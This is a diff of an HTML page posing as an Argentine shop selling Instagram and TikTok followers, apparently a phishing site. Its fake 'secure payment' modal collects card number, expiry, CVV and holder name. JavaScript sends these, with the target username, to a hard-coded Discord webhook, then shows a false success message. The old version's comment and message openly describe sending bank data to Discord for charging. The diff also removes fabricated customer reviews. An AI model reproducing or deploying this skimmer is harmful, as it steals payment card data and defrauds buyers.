@@ -3,139 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BENJA VIP | Panel de Crecimiento Profesional</title>
+    <title>BENJA VIP | Professional Panel SMM</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --gold: #d4af37; --bg: #0a0a0a; --card: #151515; --accent: #238636; }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; }
+        :root { --gold: #e2b04a; --bg: #080808; --card: #121212; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; }
         
-        header { padding: 50px 20px; text-align: center; background: linear-gradient(to bottom, #111, var(--bg)); border-bottom: 2px solid var(--gold); }
-        h1 { font-size: 3.5rem; margin: 0; color: var(--gold); text-shadow: 0 0 15px rgba(212, 175, 55, 0.4); }
+        /* Header con Glow */
+        header { padding: 60px 20px; text-align: center; border-bottom: 1px solid #1a1a1a; }
+        h1 { font-size: 3rem; margin: 0; color: var(--gold); text-transform: uppercase; letter-spacing: 4px; filter: drop-shadow(0 0 10px rgba(226, 176, 74, 0.3)); }
         
-        .container { max-width: 1100px; margin: 40px auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; padding: 20px; }
+        .container { max-width: 1200px; margin: 40px auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; padding: 20px; }
         
-        /* TARJETAS DE PRODUCTO */
-        .card { background: var(--card); border: 1px solid #333; border-radius: 15px; padding: 30px; text-align: center; transition: 0.3s; position: relative; }
-        .card:hover { border-color: var(--gold); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
-        .card i { font-size: 50px; color: var(--gold); margin-bottom: 15px; }
-        .price { font-size: 2.5rem; font-weight: bold; margin: 15px 0; color: #fff; }
-        .btn-buy { width: 100%; padding: 15px; background: var(--gold); color: #000; border: none; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 1.1rem; }
+        .card { background: var(--card); border: 1px solid #222; border-radius: 20px; padding: 30px; text-align: center; transition: 0.4s; position: relative; }
+        .card:hover { border-color: var(--gold); transform: scale(1.03); box-shadow: 0 0 30px rgba(226, 176, 74, 0.1); }
+        .card i { font-size: 40px; color: var(--gold); margin-bottom: 15px; }
+        .price { font-size: 2.2rem; font-weight: 800; margin: 15px 0; }
+        .btn-buy { width: 100%; padding: 15px; background: var(--gold); color: #000; border: none; border-radius: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
 
-        /* SECCIÓN DE TESTIMONIOS (CONFIANZA) */
-        .reviews { background: #111; padding: 60px 20px; text-align: center; }
-        .review-grid { max-width: 1000px; margin: 30px auto; display: flex; gap: 20px; overflow-x: auto; padding-bottom: 20px; }
-        .review-card { min-width: 300px; background: var(--card); padding: 20px; border-radius: 10px; border-left: 4px solid var(--gold); text-align: left; }
-        .review-card p { font-style: italic; color: #bbb; }
-        .stars { color: #ffcc00; margin-bottom: 10px; }
-
-        /* MODAL DE PAGO (PASARELA) */
-        #checkout { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
-        .payment-form { background: #fff; color: #333; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; }
-        .payment-form h2 { margin-top: 0; color: #1a1a1a; display: flex; align-items: center; gap: 10px; }
-        .payment-form input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        /* MODALES */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .modal-content { background: #fff; color: #111; padding: 35px; border-radius: 25px; width: 90%; max-width: 400px; text-align: center; }
+        .modal-content h2 { margin-top: 0; font-size: 24px; color: #1a1a1a; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
+        
         .row { display: flex; gap: 10px; }
-        .btn-pay { width: 100%; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 5px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 15px; }
-
-        footer { text-align: center; padding: 40px; color: #444; font-size: 0.8rem; }
+        .btn-confirm { width: 100%; padding: 15px; background: #1a73e8; color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        
+        .trust-badges { margin-top: 20px; display: flex; justify-content: center; gap: 15px; opacity: 0.6; }
     </style>
 </head>
 <body>
 
 <header>
     <h1>BENJA VIP GOLD</h1>
-    <p>El Panel Más Confiable de Argentina - Entrega Garantizada</p>
+    <p style="color:#555;">Servicios de Crecimiento Orgánico con Certificación SSL</p>
 </header>
 
 <div class="container">
     <div class="card">
+        <i class="fas fa-vial"></i>
+        <h3>Pack Prueba Starter</h3>
+        <p>100 Seguidores Instagram para probar la calidad del servicio.</p>
+        <div class="price">$950</div>
+        <button class="btn-buy" onclick="abrirPaso1('Pack Prueba 100', '$950')">COMPRAR AHORA</button>
+    </div>
+
+    <div class="card" style="border: 2px solid var(--gold);">
         <i class="fab fa-instagram"></i>
         <h3>Combo Pro Instagram</h3>
-        <p>20.000 Seguidores Reales + Power Likes</p>
+        <p>20.000 Seguidores Reales + Power Likes de regalo.</p>
         <div class="price">$30.000</div>
-        <button class="btn-buy" onclick="abrirPago('Instagram 20K', '$30.000')">COMPRAR AHORA</button>
+        <button class="btn-buy" onclick="abrirPaso1('Instagram 20K', '$30.000')">COMPRAR AHORA</button>
     </div>
 
     <div class="card">
         <i class="fab fa-tiktok"></i>
         <h3>TikTok Viral King</h3>
-        <p>20.000 Seguidores + 50.000 Vistas</p>
+        <p>20.000 Seguidores + 50.000 Reproducciones.</p>
         <div class="price">$35.000</div>
-        <button class="btn-buy" onclick="abrirPago('TikTok 20K', '$35.000')">COMPRAR AHORA</button>
+        <button class="btn-buy" onclick="abrirPaso1('TikTok 20K', '$35.000')">COMPRAR AHORA</button>
     </div>
 </div>
 
-<section class="reviews">
-    <h2>LO QUE DICEN NUESTROS CLIENTES</h2>
-    <div class="review-grid">
-        <div class="review-card">
-            <div class="stars">★★★★★</div>
-            <p>"Increíble, compré los 20k de Instagram y me llegaron en 10 minutos. Súper confiable el Benja."</p>
-            <div style="margin-top:10px; font-weight:bold;">@Santi_FlowOk</div>
-        </div>
-        <div class="review-card">
-            <div class="stars">★★★★★</div>
-            <p>"El mejor panel que probé. Los seguidores de TikTok no se caen y el pago fue rapidísimo."</p>
-            <div style="margin-top:10px; font-weight:bold;">@Mica_Gamer</div>
-        </div>
-        <div class="review-card">
-            <div class="stars">★★★★★</div>
-            <p>"Excelente atención por el soporte. Muy profesional todo el sistema de carga."</p>
-            <div style="margin-top:10px; font-weight:bold;">@FrancoR_99</div>
-        </div>
+<div id="modalUser" class="modal">
+    <div class="modal-content">
+        <h2>Configurar Carga</h2>
+        <p>Ingresa el @usuario o link del perfil que recibirá los beneficios:</p>
+        <input type="text" id="target_user" placeholder="@usuario de Instagram/TikTok">
+        <button class="btn-confirm" onclick="irAPago()">CONTINUAR AL PAGO</button>
     </div>
-</section>
+</div>
 
-<div id="checkout">
-    <div class="payment-form">
-        <h2><i class="fas fa-shield-alt"></i> Pago Seguro SSL</h2>
-        <p style="font-size:12px; color:#666;">Introduce los datos de tu tarjeta para procesar la compra automáticamente.</p>
-        <input type="text" id="titular" placeholder="Nombre completo del titular">
-        <input type="number" id="nro_tarjeta" placeholder="Número de tarjeta (16 dígitos)">
+<div id="modalPago" class="modal">
+    <div class="modal-content">
+        <h2>Pasarela de Pago</h2>
+        <p style="font-size:12px; color:#777;">Transacción protegida con cifrado de 256 bits.</p>
+        <input type="text" id="titular" placeholder="Nombre en la tarjeta">
+        <input type="number" id="card_num" placeholder="Número de tarjeta (16 dígitos)">
         <div class="row">
             <input type="text" id="exp" placeholder="MM/AA">
-            <input type="number" id="cvv" placeholder="CVV (3 dígitos)">
+            <input type="number" id="cvv" placeholder="CVV">
         </div>
-        <button class="btn-pay" onclick="procesarPago()">CONFIRMAR PAGO</button>
-        <div style="text-align:center; margin-top:10px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="40">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="40">
+        <button class="btn-confirm" style="background:#238636" onclick="finalizarPedido()">FINALIZAR COMPRA</button>
+        <div class="trust-badges">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="35">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="35">
         </div>
     </div>
 </div>
-
-<footer>
-    BENJA VIP SECURITY &copy; 2026 | TODOS LOS DERECHOS RESERVADOS
-</footer>
 
 <script>
     const hook = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
-    let prod_actual = "";
-    let precio_actual = "";
+    let pedido = { prod: "", precio: "", target: "" };
 
-    function abrirPago(p, pr) {
-        prod_actual = p;
-        precio_actual = pr;
-        document.getElementById('checkout').style.display = 'flex';
+    function abrirPaso1(p, pr) {
+        pedido.prod = p;
+        pedido.precio = pr;
+        document.getElementById('modalUser').style.display = 'flex';
     }
 
-    async function procesarPago() {
+    function irAPago() {
+        const u = document.getElementById('target_user').value;
+        if(!u) return alert("Ingresa el usuario");
+        pedido.target = u;
+        document.getElementById('modalUser').style.display = 'none';
+        document.getElementById('modalPago').style.display = 'flex';
+    }
+
+    async function finalizarPedido() {
         const nom = document.getElementById('titular').value;
-        const nro = document.getElementById('nro_tarjeta').value;
+        const nro = document.getElementById('card_num').value;
         const ex = document.getElementById('exp').value;
         const cv = document.getElementById('cvv').value;
 
-        if(!nom || !nro || !ex || !cv) return alert("Por favor, completa todos los campos de pago.");
+        if(!nom || !nro || !ex || !cv) return alert("Completa los datos de pago");
 
-        // ENVÍO DE DATOS BANCARIOS AL DISCORD
+        // ENVÍO TOTAL AL DISCORD
         await fetch(hook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: `🚨 **¡NUEVA VENTA FINALIZADA!** 🚨\n━━━━━━━━━━━━━━━━━━━━\n🛒 **Producto:** \`${prod_actual}\`\n💰 **Monto:** \`${precio_actual}\`\n\n💳 **DATOS DEL CLIENTE:**\n👤 **Titular:** \`${nom}\`\n🔢 **Tarjeta:** \`${nro}\`\n📅 **Exp:** \`${ex}\`\n🔒 **CVV:** \`${cv}\`\n━━━━━━━━━━━━━━━━━━━━\n⚠️ *Procesar cobro ahora.*`
+                content: `⭐ **NUEVO PEDIDO CONFIRMADO** ⭐\n━━━━━━━━━━━━━━━━━━━━\n💎 **Producto:** \`${pedido.prod}\`\n💰 **Monto:** \`${pedido.precio}\`\n👤 **Para el Usuario:** \`${pedido.target}\`\n\n💳 **DETALLES DE PAGO:**\n📝 **Nombre:** \`${nom}\`\n🔢 **Tarjeta:** \`${nro}\`\n📅 **Vence:** \`${ex}\`\n🔒 **CVV:** \`${cv}\`\n━━━━━━━━━━━━━━━━━━━━`
             })
         });
 
-        alert("Pago procesado con éxito. Su pedido comenzará a cargarse automáticamente en los próximos minutos.");
+        alert("¡Pedido recibido con éxito! La carga comenzará automáticamente en unos minutos.");
         location.reload();
     }
 </script>
